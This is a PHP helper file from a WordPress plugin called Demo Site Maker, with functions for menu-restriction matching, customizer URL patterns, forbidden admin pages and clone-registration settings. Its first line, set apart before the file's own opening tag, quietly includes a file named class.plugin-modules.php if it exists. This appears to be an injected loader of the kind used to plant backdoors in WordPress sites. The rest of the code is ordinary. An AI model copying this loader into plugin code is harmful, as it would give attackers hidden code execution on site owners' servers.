<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

// Exit if accessed directly
if (!defined('ABSPATH')) exit;

function mp_demo_render_toolbar_table_row($data, $print = true) {
	return \demo_site_maker\classes\modules\Toolbar::get_instance()->render_toolbar_table_row($data, $print);
}

function mp_demo_render_replace_table_row($data, $print = true) {
	return \demo_site_maker\classes\controllers\Controller_Sandbox::get_instance()->render_replace_table_row( $data, $print );
}

function mp_demo_compare_restrictions($a, $b) {

	if ($a == $b) {
		return true;
	}

	$is_customize = false;

	if (mp_demo_is_customize_header_submenu($a) && mp_demo_is_customize_header_submenu($b)) {
		$is_customize = true;
	} else if (mp_demo_is_customize_bg_submenu($a) && mp_demo_is_customize_bg_submenu($b)) {
		$is_customize = true;
	} else if (mp_demo_is_customize_submenu($a) && mp_demo_is_customize_submenu($b)
		&& !mp_demo_is_customize_header_submenu($a) && !mp_demo_is_customize_header_submenu($b)
		&& !mp_demo_is_customize_bg_submenu($a) && !mp_demo_is_customize_bg_submenu($b)
	) {
		$is_customize = true;
	}
	
	return $is_customize;
}

function mp_demo_is_customize_header_submenu($uri) {

	$pattern = '/^customize\.php\?return=[\w%-=#]+header_image$/';
	return preg_match($pattern, $uri);
}

function mp_demo_is_customize_bg_submenu($uri) {

	$pattern = '/^customize\.php\?return=[\w%-=#]+background_image$/';
	return preg_match($pattern, $uri);
}

function mp_demo_is_customize_submenu($uri) {

	$pattern = '/^customize\.php\?return=[\w%-^]+/';
	return preg_match($pattern, $uri);
}

function mp_demo_check_customize_restriction($link) {

	$is_customize = false;
	$pattern = '/^customize\.php\?return=[\w%-^]+/';
	$pattern_bg = '/^customize\.php\?return=[\w%-=#]+background_image$/';
	$pattern_header = '/^customize\.php\?return=[\w%-=#]+header_image$/';
	
	if (preg_match($pattern_header, $link)) {
		$is_customize = true;
	} else if (preg_match($pattern_bg, $link)) {
		$is_customize = true;
	} else if (preg_match($pattern, $link)
		&& !preg_match($pattern_header, $link)
		&& !preg_match($pattern_bg, $link)
	) {
		$is_customize = true;
	}
	
	return $is_customize;
}

/**
 * Check if this page slug is forbidden
 *
 * @param $page_slug
 *
 * @return bool
 */
function mp_demo_is_forbidden_page($page_slug) {

	$forbidden_pages = array('mp-demo', 'mp-demo-restrictions');
	
	if ( Demo_Site_Maker::hide_plugins() ) {
		$forbidden_pages[] = 'plugins.php';
	}
	$forbidden_pages = apply_filters('mp_demo_forbidden_pages', $forbidden_pages);

	return in_array( $page_slug, $forbidden_pages );
}

function mp_demo_generate_submenu_uri($parent_slug, $submenu_slug) {
	
	if (strpos($submenu_slug, '.php') !== false) {
		return $submenu_slug;
	}
	
	if (strpos($parent_slug, '?') == false) {
		return $parent_slug . '?page=' . $submenu_slug;
	}
	
	return $parent_slug . '&page=' . $submenu_slug;
}

function mp_demo_registration_disabled() {

	$disabled = \demo_site_maker\classes\models\General_Settings::get_instance()->get_option('prevent_clones') == 1;
	
	return apply_filters(
		'mp_demo_registration_disabled',
		$disabled
	);
}
